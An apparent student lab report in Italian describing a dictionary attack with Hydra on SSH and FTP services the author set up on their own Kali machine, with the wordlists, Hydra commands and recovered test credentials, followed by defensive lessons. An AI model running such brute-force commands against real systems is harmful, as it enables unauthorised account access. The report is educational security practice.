# Relazione sull'Attacco di Dizionario con Hydra su SSH e FTP

Questa relazione documenta le fasi principali del lavoro svolto per simulare un attacco di dizionario su due diversi servizi di rete (SSH e FTP) utilizzando lo strumento Hydra.

---

## **Obiettivi**
1. Configurare i servizi SSH e FTP su un ambiente Kali Linux.
2. Creare liste di username e password per simulare un attacco a dizionario.
3. Utilizzare Hydra per eseguire attacchi di brute force contro i servizi configurati.
4. Verificare l'efficacia delle tecniche e riflettere sull'importanza della sicurezza delle credenziali.

---

## **Fasi dell'Esercizio**

### **1. Attacco di Dizionario su SSH**
#### **Configurazione del Servizio SSH**
1. Creazione di un nuovo utente per il test:
   ```bash
   sudo adduser test_users
   ```
   Password configurata: `testpass`.

2. Attivazione del servizio SSH:
   ```bash
   sudo service ssh start
   ```

3. Verifica dell'accesso SSH con il nuovo utente:
   ```bash
   ssh test_users@192.168.50.100
   ```
   La connessione al servizio SSH è stata verificata con successo.

#### **Creazione delle Liste**
- Lista di username (`username.txt`):
  ```
  test_users
  admin
  root
  user1
  guest
  operator
  support
  manager
  developer
  service
  backup
  tester
  account
  superuser
  sysadmin
  ```
- Lista di password (`password.txt`):
  ```
  password
  123456
  admin123
  testpass
  qwerty
  letmein
  password1
  welcome
  12345678
  changeme
  root123
  toor
  iloveyou
  securepass
  password123
  ```

#### **Attacco con Hydra**
Comando utilizzato:
```bash
hydra -L username.txt -P password.txt 192.168.50.100 -t 2 -V ssh
```
Risultati:
- Hydra ha trovato le credenziali valide:
  ```
  Username: test_users
  Password: testpass
  ```

### **2. Attacco di Dizionario su FTP**
#### **Configurazione del Servizio FTP**
1. Installazione del servizio FTP:
   ```bash
   sudo apt-get install vsftpd
   ```

2. Attivazione del servizio FTP:
   ```bash
   sudo service vsftpd start
   ```

3. Creazione di un nuovo utente FTP:
   ```bash
   sudo adduser ftp_user
   ```
   Password configurata: `ftp_pass`.

4. Modifica del file di configurazione FTP (`/etc/vsftpd.conf`) per garantire che l'utente possa accedere.

#### **Creazione delle Liste**
- Lista di username (`ftp_usernames.txt`):
  ```
  ftp_user
  admin
  root
  guest
  user1
  ```
- Lista di password (`ftp_passwords.txt`):
  ```
  123456
  password
  ftp_pass
  admin123
  welcome
  ```

#### **Attacco con Hydra**
Comando utilizzato:
```bash
hydra -L ftp_usernames.txt -P ftp_passwords.txt 127.0.0.1 -t 1 -V ftp
```
Risultati:
- Hydra ha trovato le credenziali valide:
  ```
  Username: ftp_user
  Password: ftp_pass
  ```

---

## **Conclusioni**
1. **Efficienza di Hydra:** Lo strumento ha dimostrato di essere efficace nell'identificare credenziali valide in un ambiente controllato.
2. **Importanza delle credenziali sicure:** L'uso di username e password deboli facilita gli attacchi a dizionario e brute force. Per prevenire tali attacchi:
   - Utilizzare password complesse.
   - Configurare limiti sui tentativi di accesso.
   - Implementare misure di blocco IP dopo tentativi falliti.
3. **Lezioni apprese:**
   - La configurazione corretta dei servizi è fondamentale per la sicurezza.
   - L'uso di strumenti come Hydra aiuta a comprendere le vulnerabilità dei sistemi di autenticazione.

---

**Nota:** Le simulazioni sono state effettuate in un ambiente di laboratorio controllato per scopi educativi e non devono essere utilizzate per scopi non etici.
